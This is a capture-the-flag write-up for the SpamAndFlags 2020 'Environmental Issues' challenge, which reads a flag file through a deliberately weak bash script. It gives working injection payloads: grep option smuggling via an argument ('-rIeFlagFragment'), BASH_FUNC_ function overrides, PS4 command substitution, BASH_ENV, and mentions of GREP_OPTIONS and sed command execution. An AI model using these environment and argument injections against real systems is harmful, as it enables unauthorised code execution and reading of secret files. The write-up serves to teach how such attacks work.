# SpamAndFlags 2020 - Environmental Issues

## Challenge

Guys, it's 2020. If we don't fix up our environment, we'll never save the globe. Or get enough flags out of this bug-free shell script.

Server: `nc 35.242.189.239 1337`

192+206+213+213+278+415 points, solved the first four (192+206+213+213)

## Solution (broken version)

We get a Python script ([challenge.py](challenge.py)), a shell script ([script.sh](script.sh)) and some other configuration file ([config.json](config.json) and [issues.txt](issues.txt)).

We need to do the following:
1. Create `KEY, VALUE, ARGUMENT` triplets
2. We Python code executes a restricted shell (within a new process), and within the shell sets the `KEY` environment variable to `VALUE` and executes `script.sh ARGUMENT`. So basically `KEY=VALUE script.sh ARGUMENT`
3. We get one point if the `stdout` or `stderr` of the executed process contains the content of `/flag`, which is created randomly before every script execution (`FlagFragment\{[0-9a-f]{36}\}`)
4. If we get enough points, we will receive some flags
5. Unique `KEY`s count only

```bash
#!/usr/bin/env bash

####################################
# THE ENVIRONMENTAL ISSUE DATABASE #
####################################

set -x

if ! test -z "$USE_SED"
then
    line="$(sed -n "/${1:?Missing arg1: name}/p" issues.txt)"
else
    line="$(grep "${1:?Missing arg1: name}" < issues.txt)"
    # For the Regulated version
    # line="$(grep -- "${1:?Missing arg1: name}" < issues.txt)"
fi
echo "$line"

silent() { "$@" &>/dev/null; return "$?"; }

quiet() { bash -c 'for fd in /proc/$$/fd/*
                   do eval "exec ${fd##*/}>&-"
                   done; "$@" &> /dev/null' bash "$@"; }

if ! silent hash imaginary
then
    silent imaginary
    quiet cat flag
fi
```

The first version of the challenge was broken and we could read out the content of `/flag` by abusing the `grep` options in the shell script.

For example, settings the `ARGUMENT` to `-rIeFlagFragment` will print the contents of `/flag`. The `-r` (recursive) option was needed to use the `/flag` file and the `-I` option (exclude binary files) was needed because the remote script terminated when binary files were grep-ed thanks to `-r`.

By setting the `KEY` to 15 different values, we get 4 flags:
- `SaF{NiceJobYouHaveJustKilledAllTheBees🐝StopNowBeforeItIsTooLate!}` from `SaF{NiceJobYouHaveJustKilledAllTheBees\xf0\x9f\x90\x9dStopNowBeforeItIsTooLate!}`
- `SaF{HereIsYourFlagButAtWhatPrice?https://www.youtube.com/watch?v=eROSvnr3QZM}`
- `SaF{🔥UNINTENDED💀ENVIRON🔥MENTAL💀COLLAPSE🔥}` from `SaF{\xf0\x9f\x94\xa5UNINTENDED\xf0\x9f\x92\x80ENVIRON\xf0\x9f\x94\xa5MENTAL\xf0\x9f\x92\x80COLLAPSE\xf0\x9f\x94\xa5}`

## Solution (fixed version)

The fixed version of the challenge did not allow to modify the `grep` options directly, only the arguments (`grep --`).

We could come up with 11 solutions (redefining 9 functions or built-ins and using 2 special envvars):

```python
[
    ["BASH_FUNC_grep%%", "() {  /usr/bin/env cat flag; }", "grep"],
    ["BASH_FUNC_test%%", "() {  /usr/bin/env cat flag; }", "test"],
    ["BASH_FUNC_echo%%", "() {  /usr/bin/env cat flag; }", "echo"],
    ["BASH_FUNC_bash%%", "() {  /usr/bin/env cat flag; }", "bash"],
    ["BASH_FUNC_set%%", "() {  /usr/bin/env cat flag; }", "set"],
    ["BASH_FUNC_return%%", "() {  /usr/bin/env cat flag; }", "return"],
    ["BASH_FUNC_exec%%", "() {  /usr/bin/env cat flag; }", "exec"],
    ["BASH_FUNC_eval%%", "() {  /usr/bin/env cat flag; }", "eval"],
    ["BASH_FUNC_cat%%", "() {  /usr/bin/env cat flag > /proc/$PPID/fd/1; }", "cat"],
    ["PS4", "$(/usr/bin/env cat flag)", "test"],
    ["BASH_ENV", "flag", "test"]
]
```

Unfortunately, there are four other ways:
- Setting `USE_SED` and command execution with `sed`
- Using `GREP_OPTIONS`
- Redefining `hash` and redefining `return` within the redefined `hash`
- Redefining `_command_not_found_handle` (this one really does exist)

## Other write-ups

- <https://ctftime.org/task/11524>
